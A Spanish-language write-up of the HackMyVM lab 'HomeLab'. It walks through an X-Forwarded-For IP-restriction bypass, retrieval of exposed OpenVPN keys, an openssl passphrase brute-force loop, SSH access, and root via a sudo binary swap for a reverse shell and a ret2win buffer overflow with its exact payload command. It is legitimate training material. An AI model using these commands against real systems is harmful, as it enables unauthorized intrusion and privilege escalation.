---
title: "HomeLab"
date: 2025-12-15
draft: false
description: "Writeup de la máquina HomeLab en HackMyVM."
categories: ["HackMyVM"]
tags: ["IP Restriction Bypass", "Sensitive File Disclosure", "Credential Disclosure", "Insecure VPN Configuration", "Sudo Misconfiguration", "Privilege Escalation", "Buffer Overflow"]

image: "/images/homelab.png"
level: Medium
---

# Enumeración

Vamos a comenzar con un escaneo en red con ayuda de **Arp-Scan** :

```
arp-scan -I ens33 --localnet --ignoredups
```

![img1](images/Pasted%20image%2020251210210615.png)

Podemos observar que tenemos la IP `192.168.1.101` ya con esto podemos intentar intuir el sistema operativo mediante el comando `ping`:

```bash
ping -c 1 192.168.1.101
```

![img2](images/Pasted%20image%2020251210211306.png)

Podemos observar un `ttl=64` por lo que intuimos un sistema `Linux`.

Ya en este punto vamos a realizar un escaneo para intentar ver los puertos abiertos de está máquina con ayuda de **Nmap**:

```bash
nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.101 -oG allPorts
```

![img3](images/Pasted%20image%2020251212183944.png)

Podemos observar el puerto `80` abierto, vamos a intentar determinar más información con otro escaneo mucho mas directo:

```bash
nmap -p80 -sVC 192.168.1.101 -oN target
```

![img4](images/Pasted%20image%2020251212184252.png)

Como podemos observar está corriendo el servicio de http por lo que es una web.

Realicemos un escaneo con ayuda de `whatweb` para tratar de obtener las tecnologías de la web:

```bash
whatweb http://192.168.1.101
```

![img5](images/Pasted%20image%2020251212184513.png)

Podemos ver en tecnologías que se está implementando lo que es Apache claramente, pero nada más que me llame la atención, vamos a visitar la web a ver que encontramos:

![img6](images/Pasted%20image%2020251212184806.png)

No vemos nada de primeras que sea útil, vamos a inspeccionar toda la web en búsqueda de algo sospechoso.

Vamos a realizar un escaneo de directorios a ver que logramos ver en la web, esto con ayuda de `Gobuster` :

```bash
gobuster dir -u http://192.168.1.101/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

![img7](images/Pasted%20image%2020251212185340.png)

Como vemos en la imagen tenemos una ruta `/service` vamos a ver que contiene:

![img8](images/Pasted%20image%2020251212185417.png)

Vemos un mensaje donde nos habla de que el contenido está disponible solo para él suponemos algún usuario de la máquina.

# Explotación

Llevemos esto al `BurpSuite` para ver como se está tramitando la petición:

![img9](images/Pasted%20image%2020251212185630.png)

Ya lo tenemos en el `BurpSuite`, ahora algo que llama mi atención es que habla de ser algo solo para él, pero como está detectando su conexión, vamos a intentar modificar primero la cabecera `HOST` a ver si mediante esa lo verifica o mediate que lo hace:

![img10](images/Pasted%20image%2020251212192027.png)

Vemos que no nos funciona solo esto, podemos hacer uso de la cabecera `X-Forwarded-For` (está es una cabecera muy útilizada en nodos intermediarios en los cuales es necesario registrar las IP de origen, implementada para peticiones que pasan por medio de un balanceador de carga como puede ser Nginx por ejemplo), vemos que sucede:

![img11](images/Pasted%20image%2020251212193539.png)

Como podemos observar ya tenemos una respuestá algo extraña para ser web, pero si analizamos un poco y con un poco de búsqueda encontramos que parece ser un archivo de configuración para entablar una conexión `VPN` mediante `openVPN`.

Bueno, vamos a sacar mediante curl todo ese output en un archivo `.ovpn` de la siguiente manera:

```bash
curl -s -X GET "http://192.168.1.101/service/" -H "X-Forwarded-For: 192.168.1.101" -o openvpn.ovpn
```

![img12](images/Pasted%20image%2020251212202356.png)

Perfecto ahora lo que podemos observar es que nos hacen falta partes del archivo donde vamos a ir rellenando por el momento de la siguiente manera, intuyendo cosas como el puerto por defecto que usa `openvn` que sería el `1194` mediante `UDP`, por lo tanto, podemos intentar escanear este puerto con nmap para ver si es verdad que está abierto:

```bash
nmap --open -sU -p1194 192.168.1.101
```

![img13](images/Pasted%20image%2020251212202741.png)

Podemos observar que si está abierto el puerto, por lo tanto, comenzamos a configurar de la siguiente manera por ahora:

![img14](images/Pasted%20image%2020251212202838.png)

Bueno nos faltan al parecer los apartados de `ca, cert y key` los cuales son los apartados para un PKI (public key infrastructure) donde CA (Certificate Authority) sirve para verificar que el servidor al cual nos estámos conectando es legítimo, CERT que viene a ser una especie de identificación de la persona que se quiere conectar y por último KEY que es la clave privada que se implementa par que suceda la conexión.

Bueno necesitamos estos archivos, pero sabiendo lo que tenemos que buscar podemos intentar ver si están disponibles en la misma web y esto con ayuda de **Gobuster** de la siguiente manera:

```bash
gobuster dir -u http://192.168.1.101/service -w /usr/share/seclists/Discovery/Web-Content/common.txt -x crt,cert,key
```

![img15](images/Pasted%20image%2020251213203140.png)

Como podemos observar tenemos los archivos, podemos intentar descargar los archivos uno por uno con ayuda de `curl` :

```bash
curl -s -X GET "http://192.168.1.101/service/ca.crt" -o ca.crt
```

```bash
curl -s -X GET "http://192.168.1.101/service/client.crt" -o client.crt
```

```bash
curl -s -X GET "http://192.168.1.101/service/client.key" -o client.key
```

![img16](images/Pasted%20image%2020251213204204.png)

ya con los archivos podemos terminar de configurar el archivo de `openvpn.ovpn` de la siguiente manera:

![img17](images/Pasted%20image%2020251213204418.png)

Ahora con el archivo correctamente configurado vamos a realizar la conexión de la siguiente manera:

```bash
openvpn openvpn.ovpn
```

![img18](images/Pasted%20image%2020251213204742.png)

Podemos observar que al parecer la clave o no es la correcta o está encriptada por lo que no es válida, en este punto podemos intentar desencriptar la clave mediante `openssl` con un ataque de fuerza bruta de la siguiente manera:

```bash
cat /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | while read user;do bash -c  "openssl rsa -in client.key -out newclient.key -passin pass:$user" &>/dev/null && echo "password: $user" && break;done
```

![img19](images/Pasted%20image%2020251213210652.png)

Mediante ese pequeño ataque de fuerza bruta podemos ver que la contraseña es `hiro`, además de que se generó el archivo `newclient.key` el cual reconfiguramos en el archivo `openvpn.ovpn` y generamos nuevamente la conexión:

```bash
openvpn openvpn.ovpn
```

![img20](images/Pasted%20image%2020251213211927.png)

Perfecto ya está la conexión, en este punto como podemos observar tenemos una IP que nos asigna que sería la `10.8.0.2` y tenemos al parecer una conexión a la `10.176.13.0` mediante el Host de la `10.8.0.1`.

En este punto lo que podemos intentar es realizar un escaneo de host mediante **Nmap**:

```bash
nmap -sn 10.8.0.0/24
```

![img21](images/Pasted%20image%2020251213212246.png)

Vemos que solo detecta el host y nuestra IP por lo que no tenemos más opciones, en este punto lo que podemos hacer es un escaneo de **Nmap** a la segunda IP de la siguiente manera:

```bash
nmap -sn 10.176.13.0/24
```

![img22](images/Pasted%20image%2020251213212624.png)

Como podemos observar se detectó una IP que sería la `10.176.13.37`, realicemos un escaneo de puertos a ver que encontramos:

```bash
nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.176.13.37
```

![img23](images/Pasted%20image%2020251213212751.png)

Como podemos observar tenemos dos puertos abiertos el `22 y 80`.

Algo que se me viene a la mente es intentar conectarme por el puerto `22`, si se puso atención en el archivo de configuración de `openvpn` lo que tenemos en las primeras líneas parece un usuario que sería el `shinosawa` y usemos la contraseña de `hiro`:

```bash
ssh shinosawa@10.176.13.37
```

![img24](images/Pasted%20image%2020251213213335.png)

Podemos observar que ya tenemos conexión por ssh.

# Escalada de Privilegios

En este punto lo que podemos hacer es investigar un poco el usuario con comandos usuales y vemos lo siguiente al ejecutar un `sudo -l`:

![img25](images/Pasted%20image%2020251214204951.png)

Podemos observar un archivo que permite la ejecución sin necesidad de poner la contraseña y está en nuestro home, veamos que se trata primero:

![img26](images/Pasted%20image%2020251214205135.png)

Vemos el archivo que podemos ejecutar y también podemos observar el archivo con la flag del usuario.

Ejecutemos y veamos que sucede con este archivo:

![img27](images/Pasted%20image%2020251214205240.png)

Por el texto se entiende que se intenta conectar al servidor y que va a darnos un shell. Bueno, tenemos dos forma de resolver la máquina en este punto y vamos a ver ambas.

### Sustituir el Archivo

Como ya tenemos todos los permisos en esta carpeta porque es nuestro home, vamos a crear una carpeta para mover el archivo de forma temporal:

```bash
mkdir temp
mv deepseek temp
```

![img28](images/Pasted%20image%2020251214205615.png)

Listo ahora creemos un archivo `deepseek` con instrucciones maliciosas, en este caso uno que nos permita realizar una reverse shell como root a nuestra máquina atacante de la siguiente manera:

```bash
touch deepseek
chmod +x deepseek
```

Ya con el archivo vamos a poner una reverse shell de la siguiente manera:

![img29](images/Pasted%20image%2020251214210116.png)

Ya con esto es cuestión de levantar un servidor en nuestra máquina atacante y ver si logramos ejecutar esto como root:

![img30](images/Pasted%20image%2020251214210254.png)

Listo, en este punto podemos ver la flag del usuario root:

![img31](images/Pasted%20image%2020251214210316.png)

Con esto terminamos la máquina.

### Buffer Overflow

Ahora tenemos otro método y es explotando un `Buffer Overflow` al binario `deepseek`, donde primero lo vamos a pasar a nuestra máquina atacante para lograr analizarlo:

![img32](images/Pasted%20image%2020251214210710.png)

Ya con el archivo en nuestra máquina vamos a analizarlo rápidamente con ayuda de `ghidra` haciendo un poco de ingeniería inversa. El propósito será netamente en este punto es encontrar el punto donde posiblemente inyectar el buffer overflow:

![img33](images/Pasted%20image%2020251214211140.png)

Analizamos la función `main` y vemos que dentro llama a la función `vuln`, vemos que contiene:

![img34](images/Pasted%20image%2020251214211449.png)

Podemos observar que dentro guarda una variable local que tiene un espacio asignado de 64 bytes, pero al guardar con ayuda de `fgets`, tiene un valor que no entendemos a primera, pero si lo seleccionamos vemos que nos sale en decimal:

![img35](images/Pasted%20image%2020251214211558.png)

Vemos que son `256` bytes, por lo tanto, aquí tenemos un desbordamiento, ahora podríamos intentar aquí en este punto intentar un ret2libc o alguna otra técnica, pero primero veamos las demás funciones a ver si no tenemos algo útil primero:

![img36](images/Pasted%20image%2020251214211922.png)

Vemos que tenemos una función `execute` la cual nos da una `sh`. Esto ya me ayuda mucho, ya que ahora mi ataque se basara en explotar el buffer y redirigir el programa a esta función, en este punto lo que voy a hacer es analizar con ayuda de `gdb` el binario de la siguiente manera:

```bash
gdb ./deepseek -q
```

![img37](images/Pasted%20image%2020251214212132.png)

Ahora conociendo el punto exacto done se tiene que explotar el buffer vamos a crear directamente una carga para identificar el número de caracteres que me permite llegar al `rsp` que es mi objetivo:

```
pattern create 200
```

![img38](images/Pasted%20image%2020251214212316.png)

Copiamos los caracteres y ejecutamos el programa para intentar ver en que punto se sobreescribe el `rsp`:

![img39](images/Pasted%20image%2020251214212420.png)

![img40](images/Pasted%20image%2020251214212439.png)

excelente logramos el cometido, ahora vamos a identificar cuantos caracteres son antes de sobreescribirlo:

```
pattern offset $rsp
```

![img41](images/Pasted%20image%2020251214212604.png)

Vemos que nos indica un total de 72 caracteres, probemos.
Generamos la carga útil con python:

![img42](images/Pasted%20image%2020251214212724.png)

![img43](images/Pasted%20image%2020251214212758.png)

![img44](images/Pasted%20image%2020251214212815.png)

Perfecto, si funciona, en este punto verifiquemos que protecciones tiene el binario:

![img45](images/Pasted%20image%2020251214212935.png)

Observamos que todo está desactivado, pero el que más nos importaba era la de `PIE` la cual si se combina con el ASLR nos impiden este tipo de ataque, pero al estar desactivado podemos ejecutarlo.

Ahora identifiquemos cuál es el espacio en memoria que almacena la función `execute` en la máquina de la siguiente manera:

```bash
objdump -d deepseek | grep execute
```

![img46](images/Pasted%20image%2020251214213300.png)

Perfecto ya con esto tenemos que poner esa memoria en formato Little Endian, donde el byte menos significativo va primero, quedando de la siguiente manera:

```
00 00 00 00 00 40 12 66 (antes)
66 12 40 00 00 00 00 00 (después)
```

en este punto vamos a dejarlo representado correctamente:

```
\x66\x12\x40\x00\x00\x00\x00\x00
```

Ya tenemos todo lo que necesitamos para romper el sistema, por lo que vamos a jugar con Python de la siguiente manera para explotarlo:

```bash
(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72+b"\x66\x12\x40\x00\x00\x00\x00\x00")';/bin/cat) | ./deepseek
```

![img47](images/Pasted%20image%2020251214214543.png)

Ya funciona en local, en este punto probemos en la máquina víctima de la siguiente manera:

```bash
(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72+b"\x66\x12\x40\x00\x00\x00\x00\x00")';/bin/cat) | sudo /home/shinosawa/deepseek
```

![img48](images/Pasted%20image%2020251214214745.png)

Perfecto ya tenemos la shell como root.

Podemos ver la flag:

![img49](images/Pasted%20image%2020251214214803.png)

Lab Terminado.

![img50](images/Pasted%20image%2020251214214826.png)
